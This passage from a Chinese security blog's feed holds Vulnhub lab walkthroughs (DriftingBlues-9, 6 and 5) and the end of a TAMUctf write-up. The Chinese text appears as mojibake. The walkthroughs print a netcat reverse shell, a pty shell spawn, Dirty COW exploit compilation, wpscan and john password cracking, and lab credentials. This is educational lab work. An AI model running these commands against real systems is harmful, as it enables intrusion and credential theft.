invoke__">respond_to</span>(&amp;req)</span><br><span class="line">            .<span class="title function_ invoke__">map_into_boxed_body</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">new</span>(StatusCode::UNAUTHORIZED))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(req: HttpRequest) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">res</span> = NamedFile::<span class="title function_ invoke__">open</span>(<span class="string">&quot;www/index.html&quot;</span>)?.<span class="title function_ invoke__">into_response</span>(&amp;req);</span><br><span class="line">    <span class="keyword">if</span> req.<span class="title function_ invoke__">cookie</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_ invoke__">is_none</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">rng</span> = <span class="title function_ invoke__">thread_rng</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">ident</span> = [<span class="number">0u8</span>; <span class="number">256</span>]; <span class="comment">// big un-bruteforce-able bytes</span></span><br><span class="line">        rng.<span class="title function_ invoke__">fill_bytes</span>(&amp;<span class="keyword">mut</span> ident);</span><br><span class="line">        res.<span class="title function_ invoke__">add_cookie</span>(</span><br><span class="line">            &amp;Cookie::<span class="title function_ invoke__">build</span>(<span class="string">&quot;whoami&quot;</span>, hex::<span class="title function_ invoke__">encode</span>(ident))</span><br><span class="line">                .<span class="title function_ invoke__">http_only</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">finish</span>(),</span><br><span class="line">        )?;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> std::io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">addr</span> = std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;SERVER_ADDR&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Couldn&#x27;t find an appropriate server address; did you set SERVER_ADDR?&quot;</span>);</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(|| App::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">service</span>(index).<span class="title function_ invoke__">service</span>(upload))</span><br><span class="line">        .<span class="title function_ invoke__">bind_uds</span>(addr)?</span><br><span class="line">        .<span class="title function_ invoke__">run</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://astr.cc/blog/tamuctf-2023-writeup/#web-lto">è¯¦è§£wp</a>   è¿™é‡Œä¸å¤ªæƒ³çœ‹å°±ä¸å†™äº†</p><h2 id="Flag-Fetcher"><a href="#Flag-Fetcher" class="headerlink" title="Flag Fetcher"></a>Flag Fetcher</h2><p>é¢˜ç›®</p><p>ä¸¤é“é¢˜éƒ½æ˜¯rust</p><p><a href="https://astr.cc/blog/tamuctf-2023-writeup/#flag-fetcher">è¯¦ç»†wp</a></p><p>æ¥ä¸‹æ¥å°±ä¸å†™äº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/tamuctf/tamuctf-2023/tree/master/web&quot;&gt;å®˜æ–¹wpåœ°å€&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://velog.io/@sani/TAMU-CTF-writeups&quot;&gt;éŸ©å›½</summary>
      
    
    
    
    
    <category term="TAMUctf 2023-web-å¤ç°" scheme="https://ke1nys.github.io/tags/TAMUctf-2023-web-%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhubâ€”â€”DriftingBlues-9</title>
    <link href="https://ke1nys.github.io/posts/89f41699.html"/>
    <id>https://ke1nys.github.io/posts/89f41699.html</id>
    <published>2023-04-30T14:30:47.000Z</published>
    <updated>2023-05-03T12:37:29.080Z</updated>
    
    <content type="html"><![CDATA[<p>å…ˆæ‰«ä¸€ä¸‹cæ®µå‘ç°é¶æœº</p><p><img src="../images/image-20230430223340760.png" alt="image-20230430223340760"></p><p>ç„¶åæ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230430223410966.png" alt="image-20230430223410966"></p><p>å‘ç°äº†ä¸ªæ–°ç«¯å£  æ²¡è§è¿‡</p><p><img src="../images/image-20230430223613576.png" alt="image-20230430223613576"></p><p>è¿˜æ˜¯å…ˆæŸ¥çœ‹ä¸€ä¸‹80ç«¯å£</p><p><img src="../images/image-20230430223917177.png" alt="image-20230430223917177"></p><p>æŸ¥çœ‹æºç å‘ç°ç‰ˆæœ¬å’Œæ¡†æ¶</p><p>é‚£ä¹ˆå°±å»æ‰¾ä¸€ä¸‹çœ‹å­˜ä¸å­˜åœ¨æ¼æ´</p><p><img src="../images/image-20230430224032571.png" alt="image-20230430224032571"></p><p>å‘ç°å­˜åœ¨æ¼æ´ï¼Œäºæ˜¯å°±å°è¯•è¿›è¡Œæ¼æ´åˆ©ç”¨</p><p><img src="../images/image-20230430224139189.png" alt="image-20230430224139189"></p><p>ç„¶åå°†è„šæœ¬å¤åˆ¶åˆ°å‡ºæ¥æ‰§è¡Œ</p><p><img src="../images/image-20230430224307635.png" alt="image-20230430224307635"></p><p><img src="../images/image-20230430224450992.png" alt="image-20230430224450992"></p><p>åˆšå¥½å‘ç°äº†æ•°æ®åº“çš„è´¦å·å¯†ç </p><p>è¿™é‡Œçš„è¯ä½¿ç”¨çš„python2  python3çš„è¯ä¼šæŠ¥é”™</p><p>è¿™é‡Œçœ‹çš„ä¸æ–¹ä¾¿ï¼Œäºæ˜¯å°è¯•ä¸€ä¸‹åå¼¹shell</p><p><img src="../images/image-20230430224534036.png" alt="image-20230430224534036"></p><p>å­˜åœ¨ncå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ncåå¼¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.142.129 6666 -e /bin/bash</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430224640615.png" alt="image-20230430224640615"></p><p>åå¼¹shellæˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¿›è¡Œpythonçš„shelläº¤äº’ä¸€ä¸‹</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•ä¸€ä¸‹åˆšåˆšæ‹¿åˆ°çš„æ•°æ®çš„è´¦å·å¯†ç è¿›è¡Œç”¨æˆ·çš„åˆ‡æ¢</p><p><strong><code>clapton / yaraklitepe</code></strong></p><p>å› ä¸ºç›´æ¥cd /home/clapton  æƒé™ä¸å¤Ÿ</p><p><img src="../images/image-20230430224951322.png" alt="image-20230430224951322"></p><p>æˆåŠŸäº†</p><p>ç„¶åå°±å¯ä»¥æ‹¿åˆ°ç¬¬ä¸€ä¸ªflagäº†</p><p><img src="../images/image-20230430225059208.png" alt="image-20230430225059208"></p><p>è¿™é‡Œçš„è¯åˆç»™å‡ºä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºææƒï¼š</p><p>å…ˆæŠŠinputæ–‡ä»¶ä¸‹åˆ°æœ¬åœ°</p><p>å¼€å¯æœ‰ä¸ªæœåŠ¡   python -m SimpleHTTPServer    å› ä¸ºhttpæ¨¡å—æ²¡æœ‰ï¼Œå°±åªèƒ½ç”¨è¿™ä¸ªæ¨¡å—äº†</p><p><img src="../images/image-20230430230743704.png" alt="image-20230430230743704"></p><p>æˆåŠŸä¸‹åˆ°æœ¬åœ°</p><p>è¿™é‡Œè¿›è¡Œäº†è§£å°±è¡Œäº†  ç¼“å†²åŒºæº¢å‡ºææƒçŸ¥é“å°±è¡Œ   å®é™…çš„æ“ä½œä¸å¤ªä¼š</p><p><strong>æ€»ç»“</strong></p><p>å¼€å¯pythonæœåŠ¡çš„ä¸¤ä¸ªæ–¹æ³•</p><p><strong>python -m SimpleHTTPServer</strong></p><p><strong>python -m http.server</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å…ˆæ‰«ä¸€ä¸‹cæ®µå‘ç°é¶æœº&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230430223340760.png&quot; alt=&quot;image-20230430223340760&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæ‰«ä¸€ä¸‹ç«¯å£&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../imag</summary>
      
    
    
    
    
    <category term="Vulnhubâ€”â€”DriftingBlues-9" scheme="https://ke1nys.github.io/tags/Vulnhub%E2%80%94%E2%80%94DriftingBlues-9/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhubâ€”â€”DriftingBlues-6</title>
    <link href="https://ke1nys.github.io/posts/194b0b08.html"/>
    <id>https://ke1nys.github.io/posts/194b0b08.html</id>
    <published>2023-04-30T09:31:05.000Z</published>
    <updated>2023-05-03T12:37:29.079Z</updated>
    
    <content type="html"><![CDATA[<p>å…ˆæ‰«cæ®µå‘ç°é¶æœº</p><p><img src="../images/image-20230430173241641.png" alt="image-20230430173241641"></p><p>ç„¶åæ¥ç€æ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230430173357986.png" alt="image-20230430173357986"></p><p>å‘ç°åªæœ‰ä¸€ä¸ª80ç«¯å£</p><p>äºæ˜¯è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230430173451936.png" alt="image-20230430173451936"></p><p>ç„¶åå°±å…ˆæ‰«ä¸€ä¸‹ç›®å½•å§</p><p><img src="../images/image-20230430173723541.png" alt="image-20230430173723541"></p><p><img src="../images/image-20230430173738876.png" alt="image-20230430173738876"></p><p>å‘ç°ç»™äº†ä¸€ä¸ªè·¯åŠ²</p><p>ç„¶åè¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230430173804181.png" alt="image-20230430173804181"></p><p>è¿™é‡Œçš„è¯çˆ¬è™«åè®®ä¹Ÿç»™äº†ä¸€ä¸ªæç¤º</p><p><strong>åˆ«å¿˜äº†åŠ ä¸Šï¼Œzipæ‰©å±•åˆ°ä½ çš„dir brute</strong></p><p>ç„¶ååœ¨é‡æ–°çˆ†ç ´ä¸€ä¸‹ç›®å½•ï¼Œå› ä¸ºé»˜è®¤å­—å…¸çˆ†ç ´ä¸å‡ºæ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://172.16.5.12/ -e php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100  </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430174416125.png" alt="image-20230430174416125"></p><p>æ‰«åˆ°æœ‰ä¸ªç›®å½•ï¼Œç„¶åè¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230430174504992.png" alt="image-20230430174504992"></p><p>å‘ç°ä¸‹è½½ä¸‹æ¥äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†æ˜¯è®¿é—®å¾—éœ€è¦å¯†ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¼€å§‹ä½¿ç”¨johnè¿›è¡Œçˆ†ç ´ï¼Œå°±æ˜¯å¾—å…ˆæŠŠè¿™ä¸ªç©æ„è½¬åŒ–æˆjohnèƒ½è¯†åˆ«çš„æ ·å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨å‘½ä»¤ï¼šzip2join spammer.zip  &gt;  password.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430174655867.png" alt="image-20230430174655867"></p><p>ç„¶åè¿›è¡Œçˆ†ç ´</p><p><img src="../images/image-20230430174724243.png" alt="image-20230430174724243"></p><p>çˆ†ç ´å‡ºæ¥äº†</p><p>ç„¶åè¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230430174828847.png" alt="image-20230430174828847"></p><p>å‘ç°ç»™äº†ä¸ªç±»ä¼¼è´¦å·å¯†ç çš„ä¸œè¥¿ï¼Œç„¶åå°±å¼€å§‹è¿›è¡Œåå°ç™»å½•</p><p><img src="../images/image-20230430174928134.png" alt="image-20230430174928134"></p><p>åå°ç™»å½•æˆåŠŸ</p><p>è¿™é‡Œå°±å¼€å§‹æ‰¾æ¼æ´åˆ©ç”¨ç‚¹äº†</p><p><img src="../images/image-20230430175657042.png" alt="image-20230430175657042"></p><p>è¿™é‡Œçš„è¯å¯ä»¥è¿›è¡Œæ¶æ„æ–‡ä»¶çš„ä¸Šä¼ ï¼Œåˆšå¥½å¯ä»¥è¿›è¡Œshellçš„åå¼¹</p><p>è¿™é‡Œçš„è¯å°±ä½¿ç”¨phpåå¼¹ï¼Œè¿™é‡Œçš„è¯kaliè‡ªå¸¦ï¼Œç›´æ¥ä¿®æ”¹ä½¿ç”¨å°±è¡Œäº†</p><p><img src="../images/image-20230430191641753.png" alt="image-20230430191641753"></p><p>ç„¶åè¿›å»ä¿®æ”¹ç›‘å¬çš„ipå’Œç«¯å£å°±è¡Œäº†</p><p><img src="../images/image-20230430191753036.png" alt="image-20230430191753036"></p><p>ç„¶åå¼€å§‹ç›‘å¬ç«¯å£</p><p><img src="../images/image-20230430191825803.png" alt="image-20230430191825803"></p><p>ç„¶åå°±å»æ‰¾ä¸€ä¸‹æ–‡ä»¶çš„ä¸Šä¼ åœ°å€</p><p><img src="../images/image-20230430191859356.png" alt="image-20230430191859356"></p><p><img src="../images/image-20230430191917306.png" alt="image-20230430191917306"></p><p>ç„¶åè¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230430191939612.png" alt="image-20230430191939612"></p><p>åå¼¹æˆåŠŸ</p><p>ç„¶åè¿›è¡Œpythonäº¤äº’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430192021688.png" alt="image-20230430192021688"></p><p>æˆåŠŸï¼Œç„¶åå°±å¼€å§‹è¿›è¡Œææƒäº†</p><p><img src="../images/image-20230430213348387.png" alt="image-20230430213348387"></p><p><strong>å†…æ ¸ç‰ˆæœ¬&gt;= 2.6.22</strong> ï¼Œ å°è¯•è„ç‰›ææƒ</p><p><a href="https://xz.aliyun.com/t/9757">è„ç‰›ææƒ</a></p><p><img src="../images/image-20230430213803970.png" alt="image-20230430213803970"></p><p>æ‰§è¡Œ <strong><code>searchsploit 40839</code></strong>    å› ä¸ºè¿™ä¸ªè„ç‰›å°±æ˜¯åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œææƒ</p><p><img src="../images/image-20230430214020860.png" alt="image-20230430214020860"></p><p><img src="../images/image-20230430214107311.png" alt="image-20230430214107311"></p><p>ç„¶åæœ¬åœ°å¼€å¯ä¸€ä¸ªpythonæœåŠ¡ï¼ŒæŠŠæ–‡ä»¶ä¼ åˆ°é¶æœºä¸Š</p><p><img src="../images/image-20230430214340317.png" alt="image-20230430214340317"></p><p>æˆåŠŸä¼ ä¸Šå»ï¼Œç„¶åè¿›è¡Œgccç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430214417629.png" alt="image-20230430214417629"></p><p>ç„¶åç»™å‘½ä»¤æ·»åŠ æœ€é«˜æƒé™</p><p><strong><code>chmod 777 40839</code></strong></p><p><img src="../images/image-20230430214530349.png" alt="image-20230430214530349"></p><p><img src="../images/image-20230430214743537.png" alt="image-20230430214743537"></p><p>ç„¶åå°±æ˜¯rootç”¨æˆ·äº†</p><p><img src="../images/image-20230430214806980.png" alt="image-20230430214806980"></p><p><strong>æ€»ç»“</strong></p><p>å†…æ ¸ç‰ˆæœ¬&gt;= 2.6.22  å°è¯•è„ç‰›ææƒ</p><p>å°è¯•ç ´è§£åŠ å¯†æ–‡ä»¶å¯ä»¥è€ƒè™‘å…ˆè½¬æˆjohnèƒ½è¯†åˆ«çš„æ ·å­ï¼Œç„¶ååœ¨ä½¿ç”¨johnæ¥è¿›è¡Œç ´è§£</p><p>s</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å…ˆæ‰«cæ®µå‘ç°é¶æœº&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230430173241641.png&quot; alt=&quot;image-20230430173241641&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæ¥ç€æ‰«ä¸€ä¸‹ç«¯å£&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../imag</summary>
      
    
    
    
    
    <category term="Vulnhubâ€”â€”DriftingBlues-6" scheme="https://ke1nys.github.io/tags/Vulnhub%E2%80%94%E2%80%94DriftingBlues-6/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhubâ€”â€”DriftingBlues-5</title>
    <link href="https://ke1nys.github.io/posts/80425ab2.html"/>
    <id>https://ke1nys.github.io/posts/80425ab2.html</id>
    <published>2023-04-30T07:46:24.000Z</published>
    <updated>2023-05-03T12:37:29.078Z</updated>
    
    <content type="html"><![CDATA[<p>å¼€å§‹å…ˆæ‰«ä¸€ä¸‹cæ®µå‘ç°é¶æœº</p><p><img src="../images/image-20230430155615236.png" alt="image-20230430155615236"></p><p>ç„¶åå¼€å§‹æ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230430155709668.png" alt="image-20230430155709668"></p><p>è¿˜æ˜¯æ ‡é…ä¸¤ä¸ªç«¯å£</p><p>è¿›è¡Œ80ç«¯å£çš„è®¿é—®</p><p><img src="../images/image-20230430155746105.png" alt="image-20230430155746105"></p><p>æ˜¯ä¸€ä¸ªwordpress cmsæ¡†æ¶çš„ç½‘é¡µ è¿™é‡Œä¹Ÿç»™äº†ç‰ˆæœ¬</p><p>å¯ä»¥å…ˆç”¨wpscanå·¥å…·å»è¿›è¡Œæ‰«æ</p><p>è¿™é‡Œå…ˆå»æ‰¾ä¸€ä¸‹åå°ï¼Œç”¨dirbå…ˆæ‰«ä¸€ä¸‹è¿™ä¸ªç½‘å€</p><p><img src="../images/image-20230430160144662.png" alt="image-20230430160144662"></p><p><img src="../images/image-20230430160134822.png" alt="image-20230430160134822"></p><p>æ‰«åˆ°äº†åå°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å»ç”¨wpcanå·¥å…·å»æ‰«ä¸€ä¸‹ç½‘ç«™çš„ç”¨æˆ·å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.205.142 -e u </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430160547357.png" alt="image-20230430160547357"></p><p>ç„¶åä½¿ç”¨cewlç”Ÿæˆå¯†ç å­—å…¸é…åˆwpscanè¿›è¡Œçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -m 3 -w passwd.txt http://192.168.205.142 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430160711724.png" alt="image-20230430160711724"></p><p>-m  æ˜¯æŒ‡çš„å¯†ç çš„æœ€çŸ­é•¿åº¦</p><p>ç„¶åä½¿ç”¨wpcanè¿›è¡Œçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.205.142/ -e u --passwords passwd.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430161014964.png" alt="image-20230430161014964"></p><p>æŠ¥å‡ºç”¨æˆ·åå’Œå¯†ç äº†ï¼Œæ¥ä¸‹æ¥è¿›è¡Œç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username: gill, Password: interchangeable</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430161140468.png" alt="image-20230430161140468"></p><p>æˆåŠŸè¿›è¡Œç™»å½•</p><p>äºæ˜¯å°±å¼€å§‹å°è¯•æ‰¾æ¼æ´äº†</p><p><img src="../images/image-20230430161251659.png" alt="image-20230430161251659"></p><p>å‘ç°ä¸€å¼ ç½‘ç«™é¡µé¢æ²¡æœ‰çš„å›¾ç‰‡ï¼Œäºæ˜¯å°è¯•æŠŠä»–ä¸‹è½½ä¸‹æ¥è¿›è¡ŒæŸ¥çœ‹</p><p><img src="../images/image-20230430161407371.png" alt="image-20230430161407371"></p><p>æˆåŠŸä¸‹è½½ä¸‹æ¥</p><p>è¿™é‡ŒæŸ¥çœ‹å›¾ç‰‡å¾—ä½¿ç”¨è¿™ä¸ªå·¥å…·</p><p><strong>exiftool</strong></p><p><img src="../images/image-20230430161620834.png" alt="image-20230430161620834"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get Install exiftool</span><br><span class="line">ä½¿ç”¨è¯¥å‘½ä»¤è¿›è¡Œå®‰è£…</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430162208301.png" alt="image-20230430162208301"></p><p><img src="../images/image-20230430162232774.png" alt="image-20230430162232774"></p><p>å‘ç°äº†sshçš„ç™»å½•å¯†ç ï¼Œäºæ˜¯å°è¯•å»è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230430162333707.png" alt="image-20230430162333707"></p><p>æˆåŠŸè¿›è¡Œç™»å½•</p><p><img src="../images/image-20230430162354156.png" alt="image-20230430162354156"></p><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªflagï¼Œè¿™é‡Œæœ‰ç¬¬äºŒä¸ªæ–‡ä»¶ï¼Œä¸çŸ¥é“æ˜¯å•¥</p><p>ç›´æ¥è¯»çš„è¯æ˜¯ä¹±ç </p><p>ä¸Šç½‘æœç´¢åå‘ç°</p><p><img src="../images/image-20230430162524584.png" alt="image-20230430162524584"></p><p><img src="../images/image-20230430163023836.png" alt="image-20230430163023836"></p><p>è¿™é‡Œçš„è¯æ˜¯ä½¿ç”¨scpå‘½ä»¤å°†æ–‡ä»¶å¤åˆ¶åˆ°æœ¬åœ°è¿›è¡ŒæŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp gill@192.168.142.149:/home/gill/key* /root</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430163242074.png" alt="image-20230430163242074"></p><p>æˆåŠŸä¼ è¾“ä¸‹æ¥</p><p><strong>å°† <code>keyfile.kdbx</code> å†…å®¹è½¬ä¸º <code>john</code> æ”¯æŒçš„æ ¼å¼ï¼š<code>keepass2john keyfile.kdbx &gt; Keepasshash.txt</code></strong></p><p><img src="../images/image-20230430163335747.png" alt="image-20230430163335747"></p><p>ç„¶åä½¿ç”¨johnè¿›è¡Œå¯†ç çš„çˆ†ç ´</p><p><img src="../images/image-20230430163622503.png" alt="image-20230430163622503"></p><p>çˆ†ç ´å‡ºæ¥é‚£ä¸ªåŠ å¯†æ–‡ä»¶é‡Œçš„å†…å®¹äº†</p><p>å°†åˆšæ‰çš„keyfile.kdbxæ–‡ä»¶ä¸Šä¼ åˆ°keeWeb, è¾“å…¥ç ´è§£å‡ºçš„å¯†ç å³å¯æ‰“å¼€ï¼Œå¾—åˆ°å…­ä¸ªç±»ä¼¼å¯†ç çš„å­—ç¬¦ä¸²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps://app.keeweb.info/</span><br></pre></td></tr></table></figure><p>è·å¾—äº†6ä¸ªå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2real4surreal </span><br><span class="line">buddyretard</span><br><span class="line">closet313</span><br><span class="line">exalted</span><br><span class="line">fracturedocean</span><br><span class="line">zakkwylde</span><br></pre></td></tr></table></figure><p>ç„¶åå°è¯•ä½¿ç”¨è¿™äº›å¯†ç è¿›è¡Œrootç”¨æˆ·çš„ç™»å½•å…¨éƒ½å¤±è´¥äº†</p><p><img src="../images/image-20230430170151033.png" alt="image-20230430170151033"></p><p>è¿™é‡Œçš„è¯å¯ä»¥åˆ©ç”¨è¿™ä¸ªå·¥å…·æ¥è¿›è¡Œä½¿ï¼Œçœ‹ä¸€ä¸‹è¿›ç¨‹æœ‰æ²¡æœ‰å®šæ—¶æ‰§è¡Œçš„ä»»åŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kalièµ·ä¸ªä¸´æ—¶æœåŠ¡</span><br><span class="line">é¶æœºä¸‹è½½pspy64: wget http://192.168.111.7/pspy64</span><br><span class="line">ç»™äºˆæƒé™ï¼šchmod +x pspy64</span><br><span class="line">æ‰§è¡Œï¼š./pspy64</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430170732813.png" alt="image-20230430170732813"></p><p>æˆåŠŸä¸‹è½½ä¸‹è½½åˆ°é¶æœºä¸Š</p><p><img src="../images/image-20230430171115969.png" alt="image-20230430171115969"></p><p>è¿™ä¸ªä»»åŠ¡æ¯éš”ä¸€åˆ†é’Ÿå°±è‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡ï¼Œäºæ˜¯å°±çŒœæµ‹æ˜¯ä¼šå®šæ—¶æ‰§è¡Œä»»åŠ¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è€ƒè™‘ä½¿ç”¨ä»–æ¥è¿›è¡Œææƒäº†</p><p><img src="../images/image-20230430171233766.png" alt="image-20230430171233766"></p><p>åœ¨æ ¹ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªè¯¡å¼‚çš„ç›®å½•ï¼Œäºæ˜¯è¿›è¡ŒæŸ¥çœ‹</p><p>é‚£ä¹ˆçŒœæµ‹æ˜¯ä½¿ç”¨ä»–è¿›è¡Œææƒï¼Œè¿™é‡Œä¹…åˆšå¥½ç”¨åˆ°ä¹‹å‰çˆ†ç ´å‡ºæ¥çš„å¯†ç äº†ï¼Œåœ¨æŸ¥çœ‹åˆ«äººçš„wpï¼Œå‘ç°key.shæºç çš„æ„æ€æ˜¯ï¼Œå¦‚æœè¿™ä¸ªæ–‡ä»¶ä¸‹æœ‰fracturedoceanè¿™ä¸ªæ–‡ä»¶çš„è¯ï¼Œå°±ä¼šæ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼Œå°±ä¼šæŠŠè£…æœ‰rootï¼Œå¯†ç çš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p><p><img src="../images/image-20230430171856129.png" alt="image-20230430171856129"></p><p>æ‹¿åˆ°å¯†ç </p><p><img src="../images/image-20230430171951855.png" alt="image-20230430171951855"></p><p>è¿™å°±æ˜¯key.shçš„æ–‡ä»¶å†…å®¹äº†</p><p><strong>Vulnhubé¶æœºæ¸—é€æ€»ç»“ï¼š</strong><br>1.cewl ç”Ÿæˆå­—å…¸å’Œwpscan å·¥å…·æš´åŠ›ç ´è§£çš„ä½¿ç”¨<br>2.Exiftool è¿™ä¸ªå·¥å…·ç”¨æ¥å¯¹EXIFä¿¡æ¯è§£æ(ç¬¬ä¸€æ¬¡äº†è§£è¿™ä¸ªå·¥å…·çš„ä½¿ç”¨å’Œä½œç”¨)<br>3..kdbxæ–‡ä»¶å¯†ç ç ´è§£ï¼ˆæ–°çŸ¥è¯†ç‚¹ï¼Œç¬¬ä¸€æ¬¡åšèŠ±çš„æ—¶é—´æ¯”è¾ƒå¤šï¼‰<br>4.å¦‚æœä¸´æ—¶å¼€å¯ä¸äº†webæœåŠ¡ å¯ä»¥ä½¿ç”¨scp è¿™ä¸ªå‘½ä»¤ï¼ˆéå¸¸å¥½ç”¨ï¼ï¼ï¼‰<br>5.è§£å¯† keepass æ•°æ®åº“è·å–å¯†ç ï¼ˆè™½ç„¶æ²¡å•¥ç”¨ ä½†æ˜¯ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡äº†è§£ æ–°çŸ¥è¯†ç‚¹ï¼‰<br>6.å®šæ—¶ææƒ ä¸‹è½½è„šæœ¬pspy64 æŸ¥çœ‹ åˆ›å»ºkey æ–‡ä»¶ææƒ</p><p>è¿™é‡Œçš„pspy64å¯ä»¥è¿›è¡Œè¿›ç¨‹çš„æŸ¥çœ‹(ä¸ç”¨rootæƒé™)ï¼Œåˆšå¥½å¯ä»¥è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨å®šæ—¶ææƒ</p>]]></content>
    
    
      
      
